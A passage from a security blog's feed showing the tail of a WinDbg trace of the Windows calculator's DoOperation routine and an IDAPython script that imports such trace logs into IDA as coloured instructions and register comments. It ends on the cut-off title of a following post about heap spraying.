gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6b7:&lt;br /&gt;00491462 8b7de8&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,dword ptr [ebp-18h] ss:0023:0020e370=00000001&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000001&lt;br /&gt;eip=00491465 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6ba:&lt;br /&gt;00491465 0faf7d0c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; imul&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,dword ptr [ebp+0Ch] ss:0023:0020e394=00000001&lt;br /&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000001&lt;br /&gt;eip=00491469 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6be:&lt;br /&gt;00491469 e8074efeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!divrat (00476275)&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=00000000 edx=00000009 esi=006cc420 edi=00000001&lt;br /&gt;eip=0049146e esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6cd:&lt;br /&gt;0049146e 837b0800&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebx+8],0&amp;nbsp; ds:0023:006cc280=00000000&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=00000000 edx=00000009 esi=006cc420 edi=00000001&lt;br /&gt;eip=00491472 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x6d1:&lt;br /&gt;00491472 0f84d3400000&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0x930 (0049554b) [br=1]&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=00000000 edx=00000009 esi=006cc420 edi=00000001&lt;br /&gt;eip=0049554b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x930:&lt;br /&gt;0049554b 837dec00&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h],0 ss:0023:0020e374=00375548&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=00000000 edx=00000009 esi=006cc420 edi=00000001&lt;br /&gt;eip=0049554f esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x934:&lt;br /&gt;0049554f 0f84f7faffff&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0xf5 (0049504c) [br=0]&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=00000000 edx=00000009 esi=006cc420 edi=00000001&lt;br /&gt;eip=00495555 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x93a:&lt;br /&gt;00495555 ff75ec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h]&amp;nbsp; ss:0023:0020e374=00375548&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=00000000 edx=00000009 esi=006cc420 edi=00000001&lt;br /&gt;eip=00495558 esp=0020e34c ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x93d:&lt;br /&gt;00495558 e848cbfdff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_destroyrat (004720a5)&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=75f376dc edx=00360174 esi=006cc420 edi=00000001&lt;br /&gt;eip=0049555d esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x942:&lt;br /&gt;0049555d e9eafaffff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0xf5 (0049504c)&lt;br /&gt;eax=00000000 ebx=006cc278 ecx=75f376dc edx=00360174 esi=006cc420 edi=00000001&lt;br /&gt;eip=0049504c esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0xf5:&lt;br /&gt;0049504c e81acffdff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!_EH_epilog3 (00471f6b)&lt;br /&gt;eax=00000000 ebx=006cc420 ecx=00495051 edx=00360174 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495051 esp=0020e38c ebp=0020e47c iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0xfa:&lt;br /&gt;00495051 c20c00&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ret&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0Ch&lt;br /&gt;0:000&amp;gt; .logclose&lt;br /&gt;Closing open log file calc.log&lt;/textarea&gt;&lt;/pre&gt;&lt;br /&gt;Obviously, manually annotating all of this information in IDA is the work of an unpaid intern. I, on the other hand, value my time and wrote the following script to parse out the log file and import it into IDA:&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="30" wrap="off"&gt;# Windbg log parser IDApython script&lt;br /&gt;# Author: Matthew Graeber&lt;br /&gt;&lt;br /&gt;# I highly recommend your WinDbg log contain the output from 'lmp'&lt;br /&gt;# Otherwise, if the module base in WinDbg and IDA don't match,&lt;br /&gt;# this will not markup IDA properly.&lt;br /&gt;&lt;br /&gt;from idaapi import *&lt;br /&gt;&lt;br /&gt;logfile = open(AskFile(1, "*.*", "Select Windbg log file"), 'r')&lt;br /&gt;&lt;br /&gt;colors = {'red':0x0000FF, 'green':0x00FF00, 'blue':0xFF0000, 'pink':0xFF00FF, 'black':0x00000000, 'white':0xFFFFFFFF}&lt;br /&gt;color = AskStr("red, green, blue, pink, black, white (default)", "Enter the color you want to use")&lt;br /&gt;&lt;br /&gt;if color in colors.keys():&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; color_val = colors[color]&lt;br /&gt;else: # default to white background&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; color_val = colors['white']&lt;br /&gt;&lt;br /&gt;line = logfile.readline()&lt;br /&gt;modules_listed = False&lt;br /&gt;&lt;br /&gt;ins_addr = [] # will contain list of addresses and comment&lt;br /&gt;base_addresses = {} # dictionary of all loaded modules and their base addresses&lt;br /&gt;registers = {} # register values during trace&lt;br /&gt;&lt;br /&gt;while line:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if 'start' in line: # beginning of module base listing&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; modules_listed = True&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; while True:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; line = logfile.readline() # read first module listing&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if '&amp;lt;none&amp;gt;' in line:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; tokens = line.strip().split()&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; base_addresses[tokens[2]] = tokens[0] # save in the following form: {'kernel32':'760f0000'}&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else: # end of module listing&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; break&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if 'eax=' in line[0:4]: # get first line of register values&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; tokens = line.strip().split()&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; for i in tokens:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; tokens2 = i.split('=')&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; registers[tokens2[0]] = tokens2[1]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if 'eip=' in line[0:4]: # get EBP and ESP from the next line&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; tokens = line.strip().split()&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; for i in tokens:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; tokens2 = i.split('=')&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if tokens2[0] == 'esp':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;registers[tokens2[0]] = tokens2[1]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if tokens2[0] == 'ebp':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;registers[tokens2[0]] = tokens2[1]&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if 'cs=' in line[0:3]:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; module = logfile.readline()&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; module = module.split('!')[0] # extract module name&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; line = logfile.readline() # extract addr, opcode, instruction&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; tokens = line.strip().split()&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if tokens[1] != 'cc': # skip debug breakpoints&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if modules_listed: # Calculate offsets from module base&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; base = long(base_addresses[module], 16) # convert hex string to IDA ea form&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; temp = [long(tokens[0], 16) - base]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else: # use absolute virtual addresses&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; temp = [long(tokens[0], 16)] # convert hex string to IDA ea form&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; for i in registers.keys(): # Make comments for referenced registers&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if i in line:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; temp.append(i + "=" + registers[i])&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; temp2 = tokens[len(tokens)-1] # get last item in line&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ':' in temp2: # check for pointer dereference&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; temp2 = temp2.split(':')&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; temp.append("Ptr deref: " + temp2[len(temp2)-1]) # append opcode pointer for IDA comment&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ins_addr.append(temp)&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; line = logfile.readline() # move on to next line&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;for i in ins_addr:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if modules_listed:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ea = i[0] + get_imagebase()&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; else:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ea = i[0]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ea == BADADDR:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; print("BAD ADDRESS @ 0x%08x" % ea)&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; continue&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; SetColor(ea, idc.CIC_ITEM, color_val)&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if len(i) &amp;gt; 1:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; commentStr = ""&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; for j in range(1, len(i)):&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; commentStr += i[j]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; if j != len(i) - 1:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; commentStr += "\n"&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if Comment(ea):&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; MakeComm(ea, Comment(ea) + "\n" + commentStr) # Prevents overwriting existing comments&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; else:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; MakeComm(ea, commentStr)&lt;br /&gt;&lt;br /&gt;logfile.close()&lt;/textarea&gt;&lt;/pre&gt;&lt;br /&gt;The script has the following features:&lt;br /&gt;&lt;br /&gt;• Prompts user for WinDbg log file to load&lt;br /&gt;• Prompts user for the instruction highlight color (real men use pink) ;P&lt;br /&gt;• Parses the output of the ‘lmp’ command and calculates instruction offsets from the module base address&lt;br /&gt;• Creates comments for the values of referenced registers&lt;br /&gt;• Creates comments for the value of pointer dereferences&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: center;"&gt; Here is what the graph of DoOperation looks like before 1000 / 4 is performed:&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://2.bp.blogspot.com/-_VRl67yYNpo/TjQ6N0o98gI/AAAAAAAAABw/zsNxTQnVxS0/s1600/DoOperation_Before.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="640" src="http://2.bp.blogspot.com/-_VRl67yYNpo/TjQ6N0o98gI/AAAAAAAAABw/zsNxTQnVxS0/s640/DoOperation_Before.png" width="534" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: center;"&gt; Here is what the graph of DoOperation looks like after 1000 / 4 is performed:&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://4.bp.blogspot.com/-rtghPbxZqCo/TjQ5pqwmG2I/AAAAAAAAABs/eqdZmprt7bQ/s1600/DoOperation_After.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="640" src="http://4.bp.blogspot.com/-rtghPbxZqCo/TjQ5pqwmG2I/AAAAAAAAABs/eqdZmprt7bQ/s640/DoOperation_After.png" width="521" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: center;"&gt; You can see the highlighted instructions and the values of any referenced registers and pointers.&lt;/div&gt;&lt;br /&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://2.bp.blogspot.com/-TswvEiTED8g/TjQ5iKnSaMI/AAAAAAAAABo/rtB12Dgt86w/s1600/DoOperation_After_Comments.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="240" src="http://2.bp.blogspot.com/-TswvEiTED8g/TjQ5iKnSaMI/AAAAAAAAABo/rtB12Dgt86w/s400/DoOperation_After_Comments.png" width="400" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Hopefully, by now you can see the power of IDApython in improving your analysis workflow. If you use this script, I welcome your feedback!&lt;br /&gt;&lt;br /&gt;References:&lt;br /&gt;&lt;br /&gt;&lt;a name="5_1"&gt;&lt;/a&gt;1. Cody Pierce, “MindshaRE: Hit Tracing in WinDbg,” July 17, 2008, &lt;a href="http://dvlabs.tippingpoint.com/blog/2008/07/17/mindshare-hit-tracing-in-windbg"&gt;http://dvlabs.tippingpoint.com/blog/2008/07/17/mindshare-hit-tracing-in-windbg&lt;/a&gt;&lt;br /&gt;&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-545479141637046610?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Sat, 30 Jul 2011 17:29:00 +0000</pubDate></item><item><title>Targeted Heap Spraying – 0x0c0c0c0c is a Thing of the 